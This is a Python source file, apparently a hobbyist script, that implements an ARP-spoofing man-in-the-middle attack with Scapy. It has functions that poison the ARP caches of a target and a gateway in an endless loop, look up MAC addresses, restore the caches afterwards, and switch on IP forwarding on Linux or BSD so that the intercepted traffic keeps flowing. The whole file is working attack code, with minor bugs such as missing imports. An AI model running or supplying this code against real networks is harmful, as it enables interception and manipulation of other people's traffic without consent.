import time
import subprocess

from scapy.all import *
from termcolor import colored
import netifaces as ni

# restore the arped targets
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

# poison the targets
def poison(gateway_ip, gateway_mac, target_ip, target_mac, delay=5):
    while True:
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
        time.sleep(delay)

# get the mac addr of an ip
def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src

# ip forward your' computer to let the network flow
def ip_forward():
    if sys.platform == 'linux' or sys.platform == 'linux2':
        with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
            data = forward_file.read()
            data = data.strip()                     # check if ipv4 forward
            forward_file.close()                    # is active
        print colored("[^] ip_forward configuration: %s" % data, "blue")
        if "0" in data:                             # if data is 0
            print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
            , "red")
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")                        # modify the ip_forward to on
                f.close()
    else:
        data = re.findall( r'\d+', subprocess.check_output(["sysctl", "-w", "net.inet.ip.forwarding"]))[0]
        print colored("[^] ip_forward configuration: %s" % data, "blue")
        if "0" in data:
            print colored("[!] modifing net.inet.ip.forwarding to 1", "red")
            subprocess.check_output(["sysctl", "-w", "net.inet.ip.forwarding=1"])

def get_ip(interface):
        return ni.ifaddresses(interface)[2][0]['addr']
